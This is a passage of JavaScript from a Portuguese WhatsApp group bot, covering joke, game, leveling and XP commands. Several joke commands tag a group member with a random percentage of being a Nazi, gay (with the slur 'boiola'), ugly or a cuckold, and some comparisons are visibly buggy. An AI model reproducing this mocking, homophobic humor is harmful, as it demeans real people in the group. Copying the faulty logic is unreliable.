safeSendMessage(from, {image: {url: 'https://i.ibb.co/dw8SVvQm/875aedac-48a2-419b-a7c2-face8f957cc9.jpg'}, caption: txt, buttons: [
{
buttonId: `${prefix}ping`,
buttonText: { displayText: '「 ⚡️ 」𝐏𝐈𝐍𝐆「 ⚡️ 」' },
type: 1
}], headerType: 1, viewOnce: true, contextInfo: {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: newscanal,
newsletterName: nomecanal,
serverMessageId: ''
}
}
}, {quoted: non});
break

case 'nazista':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
safeSendMessage(from, {text: `Pesquisando a sua ficha de nazista: *@${sender_ou_n.split("@")[0]}* aguarde...`, mentions: [sender_ou_n]}, {quoted: non})
setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
safeSendMessage(from, {image: {url: imgnazista}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa nazista?\n• Porcentagem de chance de ser uma pessoa nazista: *${random}%.* `, mentions: [sender_ou_n]}, {quoted: non})
}, 7000)
break 

case 'gay':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
safeSendMessage(from, {text: `Pesquisando a sua ficha de gay: @${sender_ou_n.split("@")[0]} aguarde...`, mentions: [sender_ou_n]}, {quoted: non})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
feio = random
boiola = random
if(boiola < 20 ) {var bo = 'hmm... você é hetero...'} else if(boiola == 21 ) {var bo = '+/- boiola'} else if(boiola == 23 ) {var bo = '+/- boiola'} else if(boiola == 24 ) {var bo = '+/- boiola'} else if(boiola == 25 ) {var bo = '+/- boiola'} else if(boiola == 26 ) {var bo = '+/- boiola'} else if(boiola == 27 ) {var bo = '+/- boiola'} else if(boiola == 2 ) {var bo = '+/- boiola'} else if(boiola == 29 ) {var bo = '+/- boiola'} else if(boiola == 30 ) {var bo = '+/- boiola'} else if(boiola == 31 ) {var bo = 'tenho minha desconfiança...'} else if(boiola == 32 ) {var bo = 'tenho minha desconfiança...'} else if(boiola == 33 ) {var bo = 'tenho minha desconfiança...'} else if(boiola == 34 ) {var bo = 'tenho minha desconfiança...'} else if(boiola == 35 ) {var bo = 'tenho minha desconfiança...'} else if(boiola == 36 ) {var bo = 'tenho minha desconfiança...'} else if(boiola == 37 ) {var bo = 'tenho minha desconfiança...'} else if(boiola == 3 ) {var bo = 'tenho minha desconfiança...'} else if(boiola == 39 ) {var bo = 'tenho minha desconfiança...'} else if(boiola == 40 ) {var bo = 'tenho minha desconfiança...'} else if(boiola == 41 ) {var bo = 'você é né?'} else if(boiola == 42 ) {var bo = 'você é né?'} else if(boiola == 43 ) {var bo = 'você é né?'} else if(boiola == 44 ) {var bo = 'você é né?'} else if(boiola == 45 ) {var bo = 'você é né?'} else if(boiola == 46 ) {var bo = 'você é né?'} else if(boiola == 47 ) {var bo = 'você é né?'} else if(boiola == 4 ) {var bo = 'você é né?'} else if(boiola == 49 ) {var bo = 'você é né?'} else if(boiola == 50 ) {var bo = 'você é ou não?'} else if(boiola > 51) {var bo = 'você é gay...'
}
safeSendMessage(from, {image: {url: imggay}, caption: `Qual é a porcentagem de chance do(a) *@${sender_ou_n.split("@")[0]}* ser gay?\n• *${random}% homossexual*, ${bo}`, mentions: [sender_ou_n], thumbnail:null}, {quoted: non})
}, 7000)
break

case 'feio':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
safeSendMessage(from, {text: `Pesquisando a sua ficha de feio: *@${sender_ou_n.split("@")[0]}* aguarde...`, mentions: [sender_ou_n]}, {quoted: non})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
feio = random
if(feio < 20 ) {var bo = 'É não é feio'} else if(feio == 21 ) {var bo = '+/- feio'} else if(feio == 23 ) {var bo = '+/- feio'} else if(feio == 24 ) {var bo = '+/- feio'} else if(feio == 25 ) {var bo = '+/- feio'} else if(feio == 26 ) {var bo = '+/- feio'} else if(feio == 27 ) {var bo = '+/- feio'} else if(feio == 2 ) {var bo = '+/- feio'} else if(feio == 29 ) {var bo = '+/- feio'} else if(feio == 30 ) {var bo = '+/- feio'} else if(feio == 31 ) {var bo = 'ainda tá na média'} else if(feio == 32 ) {var bo = 'dá pra pegar umas(ns) novinha(o) ainda'} else if(feio == 33 ) {var bo = 'Da pra pegar umas(ns) novinha(o) ainda'} else if(feio == 34 ) {var bo = 'é fein, mas tem baum coração'} else if(feio == 35 ) {var bo = 'tá na média, mas não deixa de ser feii'} else if(feio == 36 ) {var bo = 'bonitin mas é feio com orgulho'} else if(feio == 37 ) {var bo = 'feio e preguiçoso(a), vai se arrumar praga feia'} else if(feio == 3 ) {var bo = 'tenho '} else if(feio == 39 ) {var bo = 'feio, mas um banho e se arrumar, deve resolver'} else if(feio == 40 ) {var bo = 'fein,  mas não existe gente feia, existe gente que não conhece os produtos jequity'} else if(feio == 41 ) {var bo = 'você é Feio, mas é legal, continue assim'} else if(feio == 42 ) {var bo = 'Nada que uma maquiagem e se arrumar, que não resolva.'} else if(feio == 43 ) {var bo = 'Feio que dói de ver, compra uma máscara que melhora'} else if(feio == 44 ) {var bo = 'Feio mas nada que um saco na cabeça não resolva né!?'} else if(feio == 45 ) {var bo = 'você é feio, mas tem bom gosto'} else if(feio == 46 ) {var bo = 'feio mas tem muitos amigos'} else if(feio == 47 ) {var bo = 'é feio mas tem lábia pra pegar várias novinha'} else if(feio == 4 ) {var bo = 'feio e ainda não sabe se vestir, vixi'} else if(feio == 49 ) {var bo = 'feiooo dms vey.'} else if(feio == 50 ) {var bo = 'você é feio, mas não se encherga.'} else if(feio > 51) {var bo = 'você é feio demais bixo.'}
safeSendMessage(from, {image: {url: imgfeio}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa feia?\n• A porcentagem de chance é *${random}%*, ${bo}`, mentions: [sender_ou_n], thumbnail:null}, {quoted: non})
}, 7000)
break 

case 'corno':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
safeSendMessage(from, {text:`Pesquisando a ficha de corno @${sender_ou_n.split("@")[0]}, aguarde...`, mentions: [sender_ou_n]}, {quoted: non})
setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
safeSendMessage(from, {image: {url: imgcorno}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa chifruda?\n• A porcentagem de chance é *${random}%*`, mentions: [sender_ou_n]}, {quoted: non})
}, 7000)
break

case 'bebado':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
safeSendMessage(from, {text:`Pesquisando a ficha de bebado(a) @${sender_ou_n.split("@")[0]}, aguarde...`, mentions: [sender_ou_n]}, {quoted: non})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
safeSendMessage(from, {image: {url: imgbebado}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa bêbada?\n• A porcentagem de chance é *${random}%*`, mentions: [sender_ou_n]}, {quoted: non})
}, 7000)
break 

case 'gado':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
safeSendMessage(from, {text:`Pesquisando a ficha de gado @${sender_ou_n.split("@")[0]}, aguarde...`, mentions: [sender_ou_n]}, {quoted: non})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
safeSendMessage(from, {image: {url: imggado}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser um gado?\n• A porcentagem de chance é *${random}%*`, mentions: [sender_ou_n]}, {quoted: non})
}, 7000)
break 

case 'gostoso':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
safeSendMessage(from, {text:`Pesquisando a sua ficha de gostoso @${sender_ou_n.split("@")[0]} aguarde...`, mentions: [sender_ou_n]}, {quoted: non})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
safeSendMessage(from, {image: {url: imggostoso}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa gostosa?\n• A porcentagem de chance é *${random}%*`, gifPlayback: true, mentions: [sender_ou_n]}, {quoted: non})
}, 7000)
break 

case 'gostosa':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
safeSendMessage(from, {text:`Pesquisando a sua ficha de gostosa @${sender_ou_n.split("@")[0]} aguarde...`, mentions: [sender_ou_n]}, {quoted: non})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
safeSendMessage(from, {image: {url: imggostosa}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa gostosa?\n• A porcentagem de chance é *${random}%*`, gifPlayback: true, mentions: [sender_ou_n]}, {quoted: non})
}, 7000)
break 

case 'morte': case 'death':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
if (!q) return await enviar(`🔹 Uso correto: ${prefix + command} yato`)
const predea = await axios.get(`https://api.agify.io/?name=${encodeURIComponent(args[0])}`);
if (predea.data.age == null) return await enviar(`Você inseriu um nome invalido, certifique-se de inserir um sem acentos, emojis, números e outros.`);
death = `@${sender.split('@')[0]} — Pessoas com este nome citado “${predea.data.name}” tendem a morrer aos ${predea.data.age} anos de idade.`;
safeSendMessage(from, {video: {url: deathcmd}, gifPlayback: true, caption: death, mentions: [sender]}, {quoted: non})
break;				
				
case 'matar': case 'mata':  
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
if(!menc_os2 || menc_jid2[1]) return enviar('marque o alvo que você quer matar, a mensagem ou o @')
safeSendMessage(from, {video: {url: matarcmd}, gifPlayback: true, caption: `Você acabou de matar o(a) @${menc_os2.split('@')[0]} 👹`, mentions: [menc_os2]}, {quoted: non})
break 

case 'abraco':
case 'abraço':
case 'abraçar':
case 'abraça':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
if(!menc_os2 || menc_jid2[1]) return enviar('marque a pessoa que você quer abraçar, a mensagem ou o @')
safeSendMessage(from, {video: {url: 'https://qu.ax/abvPJ.mp4'}, gifPlayback: true, caption: `Você deu um abraço no(a) @${menc_os2.split('@')[0]} 🤗️💖` , mentions: [menc_os2]}, {quoted: non})
break

case 'beijo':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
if(!menc_os2 || menc_jid2[1]) return enviar('marque a pessoa que você quer beijar, a mensagem ou o @')
safeSendMessage(from, {video: {url: 'https://qu.ax/RPmNe.mp4'}, gifPlayback: true, caption: `Você deu um beijo no(a) @${menc_os2.split('@')[0]} 😁👉👈❤` , mentions: [menc_os2]}, {quoted: non})
break

case 'vab':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
psycatgames().then(async (array) => {
const { nsfw, questions } = array[Math.floor(Math.random() * array.length)]
const { pergunta1, pergunta2 } = questions[Math.floor(Math.random() * questions.length)]
sendPoll(client, from, "Você prefere..", [pergunta1, pergunta2])
}).catch(console.error);
break

case 'eununca':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
reagir(from, "🙈");
const pergunta_ = JSON.parse(fs.readFileSync('./exports/json/eununca.json'));
const getRandomINever = pergunta_[Math.floor(Math.random() * pergunta_.length)]
sendPoll(client, from, getRandomINever, ["Eu nunca", "Eu já"]).catch(console.error);
break

case 'conselhobiblico':
case 'conselhosbiblico':  
case 'conselhosb':   
case 'conselhob':  
await escrever()
await randomreact();
await sleep(1000)
var conselhosb = conselhob[Math.floor(Math.random() * conselhob.length)]
safeSendMessage(from, {text: mess.conselhoBiblico(tempo, pushname, conselhosb, NomeDoBot, groupName)}, {quoted: non, contextInfo: {"mentionedJid": mess.conselhoBiblico(tempo, pushname, conselhosb, NomeDoBot, groupName)}})
break

case 'cantadas': case 'cantada':
await escrever()
await randomreact();
await sleep(1000)
cantadasbb = randomCantadas[Math.floor(Math.random() * randomCantadas.length)]   
let cantadasText = `*${cantadasbb}*`
safeSendMessage(from, {text: cantadasText}, {quoted: non})
break

case 'fatos': case 'curiosidades':  
fatoskk = fatos[Math.floor(Math.random() * fatos.length)]   
let fatosText = `*${fatoskk}*`
safeSendMessage(from, {text: fatosText}, {quoted: non})
break

case 'tapa':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
if(!menc_os2 || menc_jid2[1]) return enviar('Marque o alvo que você quer da um tapa, a mensagem ou o @')
safeSendMessage(from, {video: {url: tapacmd}, gifPlayback: true, caption: `Você acabou de da um tapa na raba do(a) *@${menc_os2.split('@')[0]}*. 😼`, mentions: [menc_os2]}, {quoted: non})
break

case 'chute':
case 'chutar':  
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
if(!menc_os2 || menc_jid2[1]) return enviar('marque o alvo que você quer da um chute, a mensagem ou o @')
safeSendMessage(from, {video: {url: chutecmd}, gifPlayback: true, caption: `Você acabou de dar um chute em *@${menc_os2.split('@')[0]}*.`, mentions: [menc_os2]}, {quoted: non})
break 

case 'dogolpe':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
if(!menc_os2 || menc_jid2[1]) return enviar('Marque a mensagem com o comando ou marque o @ do usuário..')
randomF = ["em iludir pessoas", "em ferir os sentimentos", "em dar chifre"]
safeSendMessage(from, {text: `🌟☠️ *@${menc_os2.split("@")[0]}* é especialista *${randomF[Math.floor(Math.random() * randomF.length)]}*.`, mentions: [menc_os2]}, {quoted: non})
break

case 'shipo':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
if(!menc_os2) return enviar('Marque uma pessoa do grupo para encontrar o par dela.')
mention(`🌟 Eu shipo *@${groupMembers[Math.floor(Math.random() * groupMembers.length)].id.split('@')[0]} & @${menc_os2.split("@")[0]}* com uma porcentagem de *${Math.floor(Math.random() * 100)+"%"}*.`)
break

case 'casal':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
mention(`🌟👩🏼‍❤️‍💋‍👨🏻 - Sinto uma química muito forte entre *@${groupMembers[Math.floor(Math.random() * groupMembers.length)].id.split('@')[0]} & @${groupMembers[Math.floor(Math.random() * groupMembers.length)].id.split('@')[0]}*, com uma chance de dar certo: *${Math.floor(Math.random() * 100)+"%"}*.`)
break

case 'rank':
case 'ranklevel':
case 'rankpatente':
if(!isGroup) return enviar(arise.admin)
if(!isLevelingOn) return enviar(`Para usar o comando, primeiro o(s) admin(s) do grupo deve ativar o sistema de level.\n• Solicite a 1 do(s) administrador(es) para ativar o comando. Usar: leveling`)
if(level2.length > 4) {
cortGG = level2.map(i => i)
rank = cortGG.sort((a, b) => (a.contador < b.contador) ? 0 : -1)
if(level2.length > 10) {var totalR = 10} else {var totalR = level2.length}
tc = `️🆙️ Rank Level - [ Globalmente ] 🌎\n-`
for ( i = 0; i < totalR; i++) {
  if(i != null) {
var newlevel = rank[i].contador
if(newlevel < 100){var newpatente = "Bronze I"}; if(newlevel >= 100 && newlevel < 200){var newpatente = "Bronze II"}; if(newlevel >= 200 && newlevel < 300){var newpatente = "Bronze III"}; if(newlevel >= 300 && newlevel < 400){var newpatente = "Prata I"}; if(newlevel >= 400 && newlevel < 500){var newpatente = "Prata II"}; if(newlevel >= 500 && newlevel < 600){var newpatente = "Prata III"}; if(newlevel >= 600 && newlevel < 700){var newpatente = "Ouro I"}; if(newlevel >= 700 && newlevel < 800){var newpatente = "Ouro II"}; if(newlevel >= 800 && newlevel < 900){var newpatente = "Ouro III"}; if(newlevel >= 900 && newlevel < 1200){var newpatente = "Ouro IV"}; if(newlevel >= 1200 && newlevel < 1500){var newpatente = "Platina I"}; if(newlevel >= 1500 && newlevel < 1800){var newpatente = "Platina II"}; if(newlevel >= 1800 && newlevel < 2100){var newpatente = "Platina III"}; if(newlevel >= 2100 && newlevel < 2700){var newpatente = "Platina IV"}; if(newlevel >= 2700 && newlevel < 3300){var newpatente = "Diamante I"}; if(newlevel >= 3300 && newlevel < 3900){var newpatente = "Diamante II"}; if(newlevel >= 3900 && newlevel < 4500){var newpatente = "Diamante III"}; if(newlevel >= 4500 && newlevel < 5000){var newpatente = "Diamante IV"}; if(newlevel >= 5000 && newlevel < 5500){var newpatente = "Mestre I"}; if(newlevel >= 5500 && newlevel < 6500){var newpatente = "Mestre II"}; if(newlevel >= 6500 && newlevel < 7500){var newpatente = "Mestre III"}; if(newlevel >= 7500 && newlevel < 9000){var newpatente = "Mestre IV"}; if(newlevel >= 9000 && newlevel < 10500){var newpatente = "Elite I"}; if(newlevel >= 10500 && newlevel < 12000){var newpatente = "Elite II"}; if(newlevel >= 12000 && newlevel < 13500){var newpatente = "Elite III"}; if(newlevel >= 13500 && newlevel < 15000){var newpatente = "Elite IV"}; if(newlevel >= 15000 && newlevel < 20000){var newpatente = "Elite V"}; if(newlevel >= 20000 && newlevel < 25000){var newpatente = "Desafiante I"}; if(newlevel >= 25000 && newlevel < 30000){var newpatente = "Desafiante II"}; if(newlevel >= 30000 && newlevel < 35000){var newpatente = "Desafiante III"}; if(newlevel >= 35000 && newlevel < 40000){var newpatente = "Desafiante IV"}; if(newlevel >= 40000 && newlevel < 50000){var newpatente = "Desafiante V"}; if(newlevel >= 50000 && newlevel < 60000){var newpatente = "Superior I"}; if(newlevel >= 60000 && newlevel < 70000){var newpatente = "Superior II"}; if(newlevel >= 70000 && newlevel < 80000){var newpatente = "Mestre Supremo I"}; if(newlevel >= 80000 && newlevel < 90000){var newpatente = "Mestre Supremo II"}; if(newlevel >= 90000 && newlevel < 100000){var newpatente = "Mestre Supremo III"}; if(newlevel >= 100000 && newlevel < 150000){var newpatente = "Conquistador I"}; if(newlevel >= 150000 && newlevel < 200000){var newpatente = "Conquistador II"}; if(newlevel >= 200000 && newlevel < 300000){var newpatente = "Conquistador III"}; if(newlevel >= 300000 && newlevel < 400000){var newpatente = "Desbravador I️"}; if(newlevel >= 400000 && newlevel < 500000){var newpatente = "Desbravador II️"}; if(newlevel >= 500000 && newlevel < 1000000){var newpatente = "Desbravador III️"}; if(newlevel >= 1000000 && newlevel < 1500000){var newpatente = "Grande Mestre I"}; if(newlevel >= 1500000 && newlevel < 2000000){var newpatente = "Grande Mestre II"}; if(newlevel >= 2000000 && newlevel < 5000000){var newpatente = "Grande Mestre III"}; if(newlevel >= 5000000 && newlevel < 10000000){var newpatente = "Heroi I"}; if(newlevel >= 10000000){var newpatente = "Supremy"}
tc += `\n*${i+1}°.* Usuário(a): *${rank[i].nick}*\n• Contato URL: *wa.me/${rank[i].id.split('@')[0]}*\n• Quantidade de XP: *${rank[i].contador}*\n• Patente *${newpatente}*, level: *${rank[i].level}*\n—`
}
}
enviar(tc)
} else { 
enviar('Nenhum dado(s) foi retornado, tente novamente mais tarde️!')
}
break

case 'patente':
case 'level':
if(!isGroup) return enviar(arise.admin)
if(!isLevelingOn) return enviar(`Para usar o comando, primeiro o(s) admin(s) do grupo deve ativar o sistema de level.\n• Solicite a 1 do(s) administrador(es) para ativar o comando. Usar: leveling`)
if(JSON.stringify(level2).includes(sender)) {
levelstts = level2.map(i => i.id).indexOf(sender)
var newlevel = level2[levelstts].contador
if(newlevel < 100) newpatente = "Bronze I"
if(newlevel >= 100 && newlevel < 200) newpatente = "Bronze II"
if(newlevel >= 200 && newlevel < 300) newpatente = "Bronze III"
if(newlevel >= 300 && newlevel < 400) newpatente = "Prata I"
if(newlevel >= 400 && newlevel < 500) newpatente = "Prata II"
if(newlevel >= 500 && newlevel < 600) newpatente = "Prata III"
if(newlevel >= 600 && newlevel < 700) newpatente = "Ouro I"
if(newlevel >= 700 && newlevel < 800) newpatente = "Ouro II"
if(newlevel >= 800 && newlevel < 900) newpatente = "Ouro III"
if(newlevel >= 900 && newlevel < 1200) newpatente = "Ouro IV"
if(newlevel >= 1200 && newlevel < 1500) newpatente = "Platina I"
if(newlevel >= 1500 && newlevel < 1800) newpatente = "Platina II"
if(newlevel >= 1800 && newlevel < 2100) newpatente = "Platina III"
if(newlevel >= 2100 && newlevel < 2700) newpatente = "Platina IV"
if(newlevel >= 2700 && newlevel < 3300) newpatente = "Diamante I"
if(newlevel >= 3300 && newlevel < 3900) newpatente = "Diamante II"
if(newlevel >= 3900 && newlevel < 4500) newpatente = "Diamante III"
if(newlevel >= 4500 && newlevel < 5000) newpatente = "Diamante IV"
if(newlevel >= 5000 && newlevel < 5500) newpatente = "Paladino I"
if(newlevel >= 5500 && newlevel < 6500) newpatente = "Paladino II"
if(newlevel >= 6500 && newlevel < 7500) newpatente = "Paladino III"
if(newlevel >= 7500 && newlevel < 9000) newpatente = "Paladino IV"
if(newlevel >= 9000 && newlevel < 10500) newpatente = "Mestre I️‍"
if(newlevel >= 10500 && newlevel < 12000) newpatente = "Mestre II️‍"
if(newlevel >= 12000 && newlevel < 13500) newpatente = "Mestre III"
if(newlevel >= 13500 && newlevel < 15000) newpatente = "Mestre IV️‍"
if(newlevel >= 15000 && newlevel < 20000) newpatente = "Mestre V️‍"
if(newlevel >= 20000 && newlevel < 25000) newpatente = "Desafiante I"
if(newlevel >= 25000 && newlevel < 30000) newpatente = "Desafiante II"
if(newlevel >= 30000 && newlevel < 35000) newpatente = "Desafiante III"
if(newlevel >= 35000 && newlevel < 40000) newpatente = "Desafiante IV"
if(newlevel >= 40000 && newlevel < 50000) newpatente = "Desafiante V"
if(newlevel >= 50000 && newlevel < 60000) newpatente = "Usuário Superior I"
if(newlevel >= 60000 && newlevel < 70000) newpatente = "Usuário Superior II"
if(newlevel >= 70000 && newlevel < 80000) newpatente = "Mestre Supremo I"
if(newlevel >= 80000 && newlevel < 90000) newpatente = "Mestre Supremo II"
if(newlevel >= 90000 && newlevel < 100000) newpatente = "Mestre Supremo III"
if(newlevel >= 100000 && newlevel < 150000) newpatente = "Conquistador I️"
if(newlevel >= 150000 && newlevel < 200000) newpatente = "Conquistador II️"
if(newlevel >= 200000 && newlevel < 300000) newpatente = "Conquistador III️"
if(newlevel >= 300000 && newlevel < 400000) newpatente = "Desbravador I"
if(newlevel >= 400000 && newlevel < 500000) newpatente = "Desbravador II️"
if(newlevel >= 500000 && newlevel < 1000000) newpatente = "Desbravador III️"
if(newlevel >= 1000000 && newlevel < 1500000) newpatente = "Grande Mestre I"
if(newlevel >= 1500000 && newlevel < 2000000) newpatente = "Grande Mestre II"
if(newlevel >= 2000000 && newlevel < 5000000) newpatente = "Grande Mestre III"
if(newlevel >= 5000000 && newlevel < 10000000) newpatente = "Supremacy X"
if(newlevel >= 10000000) newpatente = "Veterano"
// É usado na barra apresentada na msg, que vai ser encaminhada pelo bot quando Usuário executar o cmd 'level' ou 'patente'.
if(newpatente == "Bronze I") {newcont = 100; newtt = 0}
if(newpatente == "Bronze II") {newcont = 200; newtt = 100}
if(newpatente == "Bronze III") {newcont = 300; newtt = 200}
if(newpatente == "Prata I") {newcont = 400; newtt = 300}
if(newpatente == "Prata II") {newcont = 500; newtt = 400}
if(newpatente == "Prata III") {newcont = 600; newtt = 500}
if(newpatente == "Ouro I") {newcont = 700; newtt = 600}
if(newpatente == "Ouro II") {newcont = 800; newtt = 700}
if(newpatente == "Ouro III") {newcont = 900; newtt = 800}
if(newpatente == "Ouro IV") {newcont = 1200; newtt = 900}
if(newpatente == "Platina I") {newcont = 1500; newtt = 1200}
if(newpatente == "Platina II") {newcont = 1800; newtt = 1500}
if(newpatente == "Platina III") {newcont = 2100; newtt = 1800}
if(newpatente == "Platina IV") {newcont = 2700; newtt = 2100}
if(newpatente == "Diamante I") {newcont = 3300; newtt = 2700}
if(newpatente == "Diamante II") {newcont = 3900; newtt = 3300}
if(newpatente == "Diamante III") {newcont = 4500; newtt = 3900}
if(newpatente == "Diamante IV") {newcont = 5000; newtt = 4500}
if(newpatente == "Paladino I") {newcont = 5500; newtt = 5000}
if(newpatente == "Paladino II") {newcont = 6500; newtt = 5500}
if(newpatente == "Paladino III") {newcont = 7500; newtt = 6500}
if(newpatente == "Paladino IV") {newcont = 9000; newtt = 7500}
if(newpatente == "Mestre I️‍") {newcont = 10500; newtt = 9000}
if(newpatente == "Mestre II") {newcont = 12000; newtt = 10500}
if(newpatente == "Mestre III️‍") {newcont = 13500; newtt = 12000}
if(newpatente == "Mestre IV️‍") {newcont = 15000; newtt = 13500}
if(newpatente == "Mestre V️‍") {newcont = 20000; newtt = 15000}
if(newpatente == "Desafiante I") {newcont = 25000; newtt = 20000}
if(newpatente == "Desafiante II") {newcont = 30000; newtt = 25000}
if(newpatente == "Desafiante III") {newcont = 35000; newtt = 30000}
if(newpatente == "Desafiante IV") {newcont = 40000; newtt = 35000}
if(newpatente == "Desafiante V") {newcont = 50000; newtt = 40000}
if(newpatente == "Usuário Superior I") {newcont = 60000; newtt = 50000}
if(newpatente == "Usuário Superior II") {newcont = 70000; newtt = 60000}
if(newpatente == "Mestre Supremo I") {newcont = 80000; newtt = 70000}
if(newpatente == "Mestre Supremo II") {newcont = 90000; newtt = 80000}
if(newpatente == "Mestre Supremo III") {newcont = 100000; newtt = 90000}
if(newpatente == "Conquistador I️") {newcont = 150000; newtt = 100000}
if(newpatente == "Conquistador II") {newcont = 200000; newtt = 150000}
if(newpatente == "Conquistador III️") {newcont = 300000; newtt = 200000}
if(newpatente == "Desbravador I️") {newcont = 400000; newtt = 300000}
if(newpatente == "Desbravador II️") {newcont = 500000; newtt = 400000}
if(newpatente == "Desbravador III️") {newcont = 1000000; newtt = 500000}
if(newpatente == "Grande Mestre I") {newcont = 1500000; newtt = 1000000}
if(newpatente == "Grande Mestre II") {newcont = 2000000; newtt = 1500000}
if(newpatente == "Grande Mestre III") {newcont = 5000000; newtt = 2000000}
if(newpatente == "Supremacy X️") {newcont = 10000000; newtt = 5000000}
// Barra de quanto falta para alcançar o próximo nível.
if(newlevel < 10000000) {
  sabPor = Number(Number(newlevel - newtt) / Number(newcont - newtt) * 100).toFixed(1)
  sabibis = newcont - newlevel
if(sabPor == 100) sabPor = `〘██████████〙${sabPor}%`
if(sabPor < 100) returnP = `〘█████████▒〙${sabPor}%`
if(sabPor < 90) returnP = `〘████████▒▒〙${sabPor}%`
if(sabPor < 80) returnP = `〘███████▒▒▒〙${sabPor}%`
if(sabPor < 70) returnP = `〘██████▒▒▒▒〙${sabPor}%`
if(sabPor < 60) returnP = `〘█████▒▒▒▒▒〙${sabPor}%`
if(sabPor < 50) returnP = `〘████▒▒▒▒▒▒〙${sabPor}%`
if(sabPor < 40) returnP = `〘███▒▒▒▒▒▒▒〙${sabPor}%`
if(sabPor < 30) returnP = `〘██▒▒▒▒▒▒▒▒〙${sabPor}%`
if(sabPor < 20) returnP = `〘█▒▒▒▒▒▒▒▒▒〙${sabPor}%`
if(sabPor < 10) returnP = `〘▒▒▒▒▒▒▒▒▒▒〙${sabPor}%`
} else {
returnP = ``
}
leveltxt = `*LEVELING* - Aqui está a sua situação:\n• Usuário: *${sender.split("@")[0]}*\n• Você está atualmente na *${newpatente}*\n• Sua quantidade atual de XP é: *${level2[levelstts].contador}* ${newlevel < 10000000 ? `para alcançar o próximo falta *${newcont}*.` : ``}\n\t🔋 ${newlevel < 10000000 ? `*${returnP}*` : ``}\n–\n${newlevel < 10000000 ? `• Falta${Number(sabibis) > 1 ? `m` : ``} *${sabibis} XP* para o próximo level.` : `Você já alcançou a patente máxima, ou seja, está muito a frente de todos.`}`
mention(`${leveltxt}`)
} else {
enviar(`Nenhuma informação foi obtida sobre seu level/patente atual em sua solicitação.\n• *Tente novamente mais tarde!* Caso seja uma falha técnica entre em contato com o dono.`)
}
break

case 'addlevel':
if(!SoDono) return enviar(arise.donosmt)
if(isCmdPremium && !isPremium) return enviar(arise.premium)
if(!q) return enviar("Digite a quantidade de level que deseja adicionar")
if(Number(args[0]) < 1) return enviar("Tem que adicionar ao menos 1 level.")
if(q.includes(".")) return enviar("Não pode número decimal.")
AB = level2.map(i => i.id).indexOf(menc_prt ? menc_prt : sender)
level2[AB].level += Number(args[0])
fs.writeFileSync("./banco de dados/usuarios/leveling.json", JSON.stringify(level2))
enviar(`${args[0]} leve${Number(args[0]) > 1 ? `is` : `l`} adicionado${Number(args[0]) > 1 ? `s` : ``} a este usuário...`)
break

case 'tirarlevel':
if(!SoDono) return enviar(arise.donosmt)
if(isCmdPremium && !isPremium) return enviar(arise.premium)
if(!q) return enviar("Digite a quantidade de level que deseja remover")
if(!Number(args[0])) return enviar(args[0] + " não é número...")
if(Number(args[0]) < 1) return enviar("Tem que tirar ao menos 1 level")
if(q.includes(".")) return enviar("Não pode número decimal")
AB = level2.map(i => i.id).indexOf(menc_prt ? menc_prt : sender)
level2[AB].level -= Number(args[0])
fs.writeFileSync("./banco de dados/usuarios/leveling.json", JSON.stringify(level2))
enviar(`${args[0]} leve${Number(args[0]) > 1 ? `is` : `l`} retirado${Number(args[0]) > 1 ? `s` : ``} deste usuário...`)
break

case 'addxp':
if(!SoDono) return enviar(arise.donosmt)
if(isCmdPremium && !isPremium) return enviar(arise.premium)
if(!q) return enviar("Digite a quantidade de XP que deseja adicionar")
if(!Number(args[0])) return enviar(args[0] + " não é número...")
if(Number(args[0]) < 1) return enviar("Tem que add ao menos 1 de XP")
if(q.includes(".")) return enviar("Não pode número decimal")
AB = level2.map(i => i.id).indexOf(menc_prt ? menc_prt : sender)
level2[AB].contador += Number(args[0])
fs.writeFileSync("./banco de dados/usuarios/leveling.json", JSON.stringify(level2))
